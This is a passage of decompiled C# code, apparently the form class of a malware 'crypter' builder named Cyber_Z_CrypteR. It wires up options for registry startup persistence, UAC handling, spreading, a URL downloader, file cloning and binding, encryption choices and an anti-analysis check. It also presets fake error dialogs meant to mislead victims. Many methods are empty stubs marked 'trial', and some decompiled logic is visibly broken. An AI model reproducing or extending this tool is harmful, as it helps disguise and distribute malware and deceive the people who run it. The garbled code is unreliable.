                return _RadioButton3;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton3_CheckedChanged);
                bool flag = _RadioButton3 != null;
                if (flag)
                    _RadioButton3.CheckedChanged -= eventHandler;
                _RadioButton3 = value;
                flag = _RadioButton3 != null;
                if (flag)
                    _RadioButton3.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton4
        {
            get
            {
                return _RadioButton4;
            }
            set
            {
                _RadioButton4 = value;
            }
        }

        internal virtual RadioButton RadioButton5
        {
            get
            {
                return _RadioButton5;
            }
            set
            {
                _RadioButton5 = value;
            }
        }

        internal virtual RadioButton RadioButton6
        {
            get
            {
                return _RadioButton6;
            }
            set
            {
                _RadioButton6 = value;
            }
        }

        internal virtual RadioButton RadioButton7
        {
            get
            {
                return _RadioButton7;
            }
            set
            {
                _RadioButton7 = value;
            }
        }

        internal virtual RadioButton RadioButton8
        {
            get
            {
                return _RadioButton8;
            }
            set
            {
                _RadioButton8 = value;
            }
        }

        internal virtual RadioButton RadioButton9
        {
            get
            {
                return _RadioButton9;
            }
            set
            {
                _RadioButton9 = value;
            }
        }

        internal virtual RButton RButton1
        {
            get
            {
                return _RButton1;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton1_Click);
                bool flag = _RButton1 != null;
                if (flag)
                    _RButton1.Click -= eventHandler;
                _RButton1 = value;
                flag = _RButton1 != null;
                if (flag)
                    _RButton1.Click += eventHandler;
            }
        }

        internal virtual RButton RButton2
        {
            get
            {
                return _RButton2;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton2_Click);
                bool flag = _RButton2 != null;
                if (flag)
                    _RButton2.Click -= eventHandler;
                _RButton2 = value;
                flag = _RButton2 != null;
                if (flag)
                    _RButton2.Click += eventHandler;
            }
        }

        internal virtual RButton RButton21
        {
            get
            {
                return _RButton21;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton21_Click);
                bool flag = _RButton21 != null;
                if (flag)
                    _RButton21.Click -= eventHandler;
                _RButton21 = value;
                flag = _RButton21 != null;
                if (flag)
                    _RButton21.Click += eventHandler;
            }
        }

        internal virtual RButton RButton22
        {
            get
            {
                return _RButton22;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton22_Click);
                bool flag = _RButton22 != null;
                if (flag)
                    _RButton22.Click -= eventHandler;
                _RButton22 = value;
                flag = _RButton22 != null;
                if (flag)
                    _RButton22.Click += eventHandler;
            }
        }

        internal virtual RButton RButton23
        {
            get
            {
                return _RButton23;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton23_Click);
                bool flag = _RButton23 != null;
                if (flag)
                    _RButton23.Click -= eventHandler;
                _RButton23 = value;
                flag = _RButton23 != null;
                if (flag)
                    _RButton23.Click += eventHandler;
            }
        }

        internal virtual RButton RButton24
        {
            get
            {
                return _RButton24;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton24_Click);
                bool flag = _RButton24 != null;
                if (flag)
                    _RButton24.Click -= eventHandler;
                _RButton24 = value;
                flag = _RButton24 != null;
                if (flag)
                    _RButton24.Click += eventHandler;
            }
        }

        internal virtual RButton RButton25
        {
            get
            {
                return _RButton25;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton25_Click);
                bool flag = _RButton25 != null;
                if (flag)
                    _RButton25.Click -= eventHandler;
                _RButton25 = value;
                flag = _RButton25 != null;
                if (flag)
                    _RButton25.Click += eventHandler;
            }
        }

        internal virtual RButton RButton28
        {
            get
            {
                return _RButton28;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton28_Click);
                bool flag = _RButton28 != null;
                if (flag)
                    _RButton28.Click -= eventHandler;
                _RButton28 = value;
                flag = _RButton28 != null;
                if (flag)
                    _RButton28.Click += eventHandler;
            }
        }

        internal virtual RButton RButton3
        {
            get
            {
                return _RButton3;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton3_Click);
                bool flag = _RButton3 != null;
                if (flag)
                    _RButton3.Click -= eventHandler;
                _RButton3 = value;
                flag = _RButton3 != null;
                if (flag)
                    _RButton3.Click += eventHandler;
            }
        }

        internal virtual RButton RButton4
        {
            get
            {
                return _RButton4;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton4_Click);
                bool flag = _RButton4 != null;
                if (flag)
                    _RButton4.Click -= eventHandler;
                _RButton4 = value;
                flag = _RButton4 != null;
                if (flag)
                    _RButton4.Click += eventHandler;
            }
        }

        internal virtual RButton RButton5
        {
            get
            {
                return _RButton5;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton5_Click);
                bool flag = _RButton5 != null;
                if (flag)
                    _RButton5.Click -= eventHandler;
                _RButton5 = value;
                flag = _RButton5 != null;
                if (flag)
                    _RButton5.Click += eventHandler;
            }
        }

        internal virtual RButton RButton6
        {
            get
            {
                return _RButton6;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton6_Click);
                bool flag = _RButton6 != null;
                if (flag)
                    _RButton6.Click -= eventHandler;
                _RButton6 = value;
                flag = _RButton6 != null;
                if (flag)
                    _RButton6.Click += eventHandler;
            }
        }

        internal virtual RadioButton RC4
        {
            get
            {
                return _RC4;
            }
            set
            {
                _RC4 = value;
            }
        }

        internal virtual Rotator Rotator1
        {
            get
            {
                return _Rotator1;
            }
            set
            {
                _Rotator1 = value;
            }
        }

        internal virtual RTheme RTheme1
        {
            get
            {
                return _RTheme1;
            }
            set
            {
                _RTheme1 = value;
            }
        }

        internal virtual Seperator Seperator5
        {
            get
            {
                return _Seperator5;
            }
            set
            {
                _Seperator5 = value;
            }
        }

        internal virtual RadioButton ServerStartup
        {
            get
            {
                return _ServerStartup;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(ServerStartup_CheckedChanged);
                bool flag = _ServerStartup != null;
                if (flag)
                    _ServerStartup.CheckedChanged -= eventHandler;
                _ServerStartup = value;
                flag = _ServerStartup != null;
                if (flag)
                    _ServerStartup.CheckedChanged += eventHandler;
            }
        }

        internal virtual CypherxGroupBox SpreadingGroupBox
        {
            get
            {
                return _SpreadingGroupBox;
            }
            set
            {
                _SpreadingGroupBox = value;
            }
        }

        internal virtual RadioButton Stairs
        {
            get
            {
                return _Stairs;
            }
            set
            {
                _Stairs = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return _TextBox1;
            }
            set
            {
                _TextBox1 = value;
            }
        }

        internal virtual TextBox TextBox11
        {
            get
            {
                return _TextBox11;
            }
            set
            {
                _TextBox11 = value;
            }
        }

        internal virtual TextBox TextBox12
        {
            get
            {
                return _TextBox12;
            }
            set
            {
                _TextBox12 = value;
            }
        }

        internal virtual TextBox TextBox16
        {
            get
            {
                return _TextBox16;
            }
            set
            {
                _TextBox16 = value;
            }
        }

        internal virtual TextBox TextBox17
        {
            get
            {
                return _TextBox17;
            }
            set
            {
                _TextBox17 = value;
            }
        }

        internal virtual TextBox TextBox2
        {
            get
            {
                return _TextBox2;
            }
            set
            {
                _TextBox2 = value;
            }
        }

        internal virtual TextBox TextBox3
        {
            get
            {
                return _TextBox3;
            }
            set
            {
                _TextBox3 = value;
            }
        }

        internal virtual TextBox TextBox4
        {
            get
            {
                return _TextBox4;
            }
            set
            {
                _TextBox4 = value;
            }
        }

        internal virtual TextBox TextBox5
        {
            get
            {
                return _TextBox5;
            }
            set
            {
                _TextBox5 = value;
            }
        }

        internal virtual TextBox TextBox7
        {
            get
            {
                return _TextBox7;
            }
            set
            {
                _TextBox7 = value;
            }
        }

        internal virtual TextBox TextBox8
        {
            get
            {
                return _TextBox8;
            }
            set
            {
                _TextBox8 = value;
            }
        }

        internal virtual TextBox TextBox9
        {
            get
            {
                return _TextBox9;
            }
            set
            {
                _TextBox9 = value;
            }
        }

        internal virtual Label TitleLabl
        {
            get
            {
                return _TitleLabl;
            }
            set
            {
                _TitleLabl = value;
            }
        }

        internal virtual RadioButton TripleDEES
        {
            get
            {
                return _TripleDEES;
            }
            set
            {
                _TripleDEES = value;
            }
        }

        internal virtual CheckBox UACheck
        {
            get
            {
                return _UACheck;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(UACheck_CheckedChanged);
                bool flag = _UACheck != null;
                if (flag)
                    _UACheck.CheckedChanged -= eventHandler;
                _UACheck = value;
                flag = _UACheck != null;
                if (flag)
                    _UACheck.CheckedChanged += eventHandler;
            }
        }

        internal virtual TextBox Url_Downloader_Text
        {
            get
            {
                return _Url_Downloader_Text;
            }
            set
            {
                _Url_Downloader_Text = value;
            }
        }

        [DebuggerNonUserCode]
        public U_S_G()
        {
            Shown += new EventHandler(USG_Shown);
            Load += new EventHandler(Loading);
            U_S_G.__ENCAddToList(this);
            InitializeComponent();
        }

        static U_S_G()
        {
            U_S_G.__ENCList = new List<WeakReference>();
            U_S_G.openclone = new OpenFileDialog();
            U_S_G.openbind = new OpenFileDialog();
        }

        private void BinderButton_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void CheckBox13_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void CheckBox15_CheckedChanged(object sender, EventArgs e)
        {
            bool flag1;

            switch (CheckBox15.Checked)
            {
                case 1:
                    TextBox1.Enabled = true;
                    RButton5.Enabled = true;
                    break;

                case 0:
                    RButton5.Enabled = false;
                    TextBox1.Enabled = false;
                    break;
            }
        }

        private void CheckBox16_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void CheckBox17_CheckedChanged(object sender, EventArgs e)
        {
            bool flag = CheckBox17.Checked;
            if (flag)
            {
                SpreadingGroupBox.Enabled = true;
            }
            else
            {
                CheckBox10.Checked = false;
                SpreadingGroupBox.Enabled = false;
            }
        }

        private void CheckBox18_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void CheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            bool flag1;

            switch (CheckBox3.Checked)
            {
                case 1:
                    CypherxGroupBox7.Enabled = true;
                    CheckBox1.Checked = false;
                    TextBox9.Text = "Cloner Activated";
                    break;

                case 0:
                    CypherxGroupBox7.Enabled = false;
                    TextBox9.Text = "Cloner De-Activated";
                    break;
            }
        }

        private void CheckBox5_CheckedChanged(object sender, EventArgs e)
        {
            bool flag1;

            switch (CheckBox5.Checked)
            {
                case 1:
                    CypherxGroupBox2.Enabled = true;
                    MsgBoxTest.Enabled = true;
                    break;

                case 0:
                    CypherxGroupBox2.Enabled = false;
                    break;
            }
        }

        private void CheckBox8_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void crypterstartup_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void Down_ExCheck_CheckedChanged(object sender, EventArgs e)
        {
            bool flag1;

            switch (Down_ExCheck.Checked)
            {
                case 1:
                    CypherxGroupBox5.Enabled = true;
                    CheckBox3.Checked = false;
                    Url_Downloader_Text.Enabled = true;
                    break;

                case 0:
                    CypherxGroupBox5.Enabled = false;
                    Url_Downloader_Text.Enabled = false;
                    break;
            }
        }

        private void GroupBox2_Click(object sender, EventArgs e)
        {
            // trial
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            // trial
        }

        private void Loading(object sender, EventArgs e)
        {
            Height = 439;
            RButton24.Text = "";
        }

        private void MsgBoxTest_Click(object sender, EventArgs e)
        {
            MessageBox.Show(TextBox16.Text, TextBox17.Text, (MessageBoxButtons)Conversions.ToInteger(U_S_G.Buttona), (MessageBoxIcon)Conversions.ToInteger(U_S_G.Icona));
        }

        private void RadioButton1_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void RadioButton11_CheckedChanged(object sender, EventArgs e)
        {
            U_S_G.Icona = 48;
        }

        private void RadioButton12_CheckedChanged(object sender, EventArgs e)
        {
            bool flag1 = RadioButton12.Checked;
            bool flag2 = flag1;
            if (flag2)
            {
                RadioButton11.Checked = true;
                RadioButton16.Checked = true;
                GroupBox11.Enabled = false;
                GroupBox9.Enabled = false;
                TextBox16.Enabled = false;
                TextBox17.Enabled = false;
                TextBox16.Text = "Run-Time error: '9'\r\nSubscript out of range";
                TextBox17.Text = "Application Error";
            }
        }

        private void RadioButton13_CheckedChanged(object sender, EventArgs e)
        {
            U_S_G.Buttona = 1;
        }

        private void RadioButton14_CheckedChanged(object sender, EventArgs e)
        {
            bool flag = RadioButton14.Checked;
            if (flag)
            {
                RadioButton2.Checked = true;
                GroupBox11.Enabled = false;
                RadioButton16.Checked = true;
                GroupBox9.Enabled = false;
                TextBox16.Enabled = false;
                TextBox17.Enabled = false;
                TextBox16.Text = "The application failed to initialize properly (0xc000007b). Click on OK to terminate the application.";
                TextBox17.Text = "Application Error";
            }
        }

        private void RadioButton15_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void RadioButton16_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void RadioButton17_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void RadioButton19_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void RadioButton2_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void RadioButton20_CheckedChanged(object sender, EventArgs e)
        {
            U_S_G.Buttona = 4;
        }

        private void RadioButton21_CheckedChanged(object sender, EventArgs e)
        {
            U_S_G.Buttona = 2;
        }

        private void RadioButton23_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void RadioButton3_CheckedChanged(object sender, EventArgs e)
        {
            U_S_G.Icona = 32;
        }

        private void RButton1_Click(object sender, EventArgs e)
        {
            bool flag2;
            int i2;

            MyProject.Forms.Cyber_Z_CrypteR.Check_Antis();
            bool flag1 = crypterstartup.Checked;
            if (flag1)
            {
                flag2 = Operators.CompareString(TextBox11.Text, "", false) == 0;
                if (flag2)
                {
                    Interaction.MsgBox("Select the Reg name", MsgBoxStyle.ApplicationModal, null);
                    goto label_1;
                }
                else
                {
                    flag2 = Operators.CompareString(Text, "", false) == 0;
                    if (flag2)
                    {
                        flag1 = Operators.CompareString(TextBox11.Text, "", false) == 0;
                        if (flag1)
                        {
                            Interaction.MsgBox("Select the Reg/File name", MsgBoxStyle.ApplicationModal, null);
                            goto label_1;
                        }
                    }
                }
            }
            flag2 = crypterstartup.Checked;
            if (flag2)
            {
                flag1 = Operators.CompareString(TextBox11.Text, "", false) == 0;
                if (flag1)
                {
                    Interaction.MsgBox("Select the Reg name", MsgBoxStyle.ApplicationModal, null);
                    goto label_1;
                }
                else
                {
                    flag2 = Operators.CompareString(Text, "", false) == 0;
                    if (flag2)
                    {
                        flag1 = Operators.CompareString(TextBox11.Text, "", false) == 0;
                        if (flag1)
                        {
                            Interaction.MsgBox("Select the Reg/File name", MsgBoxStyle.ApplicationModal, null);
                            goto label_1;
                        }
                    }
                }
            }
            Opacity = 100.0;
            int i1 = 90;
            do
            {
                Opacity = (double)i1 / 100.0;
                Thread.Sleep(20);
                i1 = checked(i1 + -10);
                i2 = 10;
            } while (i1 >= i2);
            Hide();
            MyProject.Forms.Cyber_Z_CrypteR.Show();
        label_1:;
        }

        private void RButton2_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void RButton21_Click(object sender, EventArgs e)
        {
            RButton21.Text = "";
            RButton24.Text = "#1";
            RButton22.Text = "#3";
            RButton23.Text = "#2";
            RButton28.Text = "#5";
            Rotator1.CurrentFrame = 3;
            Height = 577;
        }

        private void RButton22_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void RButton23_Click(object sender, EventArgs e)
        {
            RButton23.Text = "";
            RButton24.Text = "#1";
            RButton22.Text = "#3";
            RButton28.Text = "#5";
            RButton21.Text = "#4";
            Rotator1.CurrentFrame = 2;
            Height = 375;
        }

        private void RButton24_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void RButton25_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void RButton28_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void RButton3_Click(object sender, EventArgs e)
        {
            int i2;

            MyProject.Forms.Cyber_Z_CrypteR.Check_Antis();
            bool flag1 = crypterstartup.Checked;
            if (flag1)
            {
                bool flag2 = Operators.CompareString(TextBox11.Text, "", false) == 0;
                if (flag2)
                {
                    Interaction.MsgBox("Select the Reg name", MsgBoxStyle.ApplicationModal, null);
                    goto label_1;
                }
                else
                {
                    flag2 = Operators.CompareString(Text, "", false) == 0;
                    if (flag2)
                    {
                        flag1 = Operators.CompareString(TextBox11.Text, "", false) == 0;
                        if (flag1)
                        {
                            Interaction.MsgBox("Select the Reg/File name", MsgBoxStyle.ApplicationModal, null);
                            goto label_1;
                        }
                    }
                }
            }
            Opacity = 100.0;
            int i1 = 90;
            do
            {
                Opacity = (double)i1 / 100.0;
                Thread.Sleep(20);
                i1 = checked(i1 + -10);
                i2 = 10;
            } while (i1 >= i2);
            Hide();
            MyProject.Forms.Cyber_Z_CrypteR.Show();
        label_1:;
        }

        private void RButton4_Click(object sender, EventArgs e)
        {
            U_S_G.openclone.DefaultExt = "exe";
            U_S_G.openclone.Filter = "Executable File (*.exe)|*.exe";
            U_S_G.openclone.FilterIndex = 1;
            U_S_G.openclone.FileName = "";
            bool flag = U_S_G.openclone.ShowDialog() == DialogResult.OK;
            if (flag)
                TextBox9.Text = U_S_G.openclone.FileName;
            else
                goto label_1;
        label_1:;
        }

        private void RButton5_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.DefaultExt = "Icon Files";
            openFileDialog.Filter = "Icon Files (*.ico)|*.ico";
            openFileDialog.FilterIndex = 1;
            openFileDialog.FileName = "";
            bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
            if (flag)
            {
                TextBox2.Text = openFileDialog.FileName;
                PictureBox1.Visible = true;
                Icon icon = new Icon(openFileDialog.FileName);
                Bitmap bitmap = new Bitmap(icon.ToBitmap());
                IconPicBoxChanged.Image = bitmap;
            }
            else
            {
                goto label_1;
            }
        label_1:;
        }

        private void RButton6_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void ServerStartup_CheckedChanged(object sender, EventArgs e)
        {
            bool flag1 = ServerStartup.Checked;
            bool flag2 = flag1;
            if (flag2)
                GroupBox6.Enabled = false;
        }

        private void UACheck_CheckedChanged(object sender, EventArgs e)
        {
            // trial
        }

        private void USG_Shown(object sender, EventArgs e)
        {
            bool flag;

            Refresh();
            while (flag)
            {
                Opacity += 0.05;
                Thread.Sleep(10);
                Application.DoEvents();
                flag = Opacity != 3.0;
            }
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            // decompiler error
        }

        [DebuggerNonUserCode]
        private static void __ENCAddToList(object value)
        {
            // trial
        }

    } // class U_S_G

}

